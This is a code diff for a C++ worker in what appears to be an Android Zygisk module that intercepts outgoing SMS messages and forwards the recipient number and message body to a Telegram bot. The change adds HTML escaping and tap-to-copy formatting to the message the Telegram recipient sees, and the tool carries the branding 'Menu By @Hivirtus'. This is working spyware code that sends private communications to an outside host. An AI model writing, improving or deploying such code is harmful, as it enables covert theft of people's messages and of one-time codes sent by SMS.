@@ -147,18 +147,30 @@ void* tg_worker(void* arg) {
             if (d.size() == 10 && to_disp.find('+') == std::string::npos) to_disp = "+91" + d;
         }
         const std::string& msg = job->body.empty() ? "empty" : job->body;
-        std::string text = "📱 SMS Intercepted Zygisk Mode\n";
-        text += "Menu By @Hivirtus 🔥 --------------------\n";
-        text += "📞 To: ";
-        text += to_disp;
-        text += "\n💬 Message:\n";
-        text += msg;
+        auto html_esc = [](const std::string& s) {
+            std::string o;
+            o.reserve(s.size() + 8);
+            for (char c : s) {
+                if (c == '&') o += "&amp;";
+                else if (c == '<') o += "&lt;";
+                else if (c == '>') o += "&gt;";
+                else o += c;
+            }
+            return o;
+        };
+        // Screenshot: HTML <code> = Telegram tap-to-copy
+        std::string text = "📱 Intercepted Outgoing Zygisk Mode Menu By @Hivirtus 🔥\n\n";
+        text += "To (Tap to copy):\n<code>";
+        text += html_esc(to_disp);
+        text += "</code>\n\nBody (Tap to copy):\n<code>";
+        text += html_esc(msg);
+        text += "</code>";
 
         std::string url = "https://api.telegram.org/bot";
         url += job->token;
         url += "/sendMessage?chat_id=";
         url += url_encode(job->chat);
-        url += "&text=";
+        url += "&parse_mode=HTML&disable_web_page_preview=true&text=";
         url += url_encode(text);
 
         const bool ok = java_http_get(env, url);
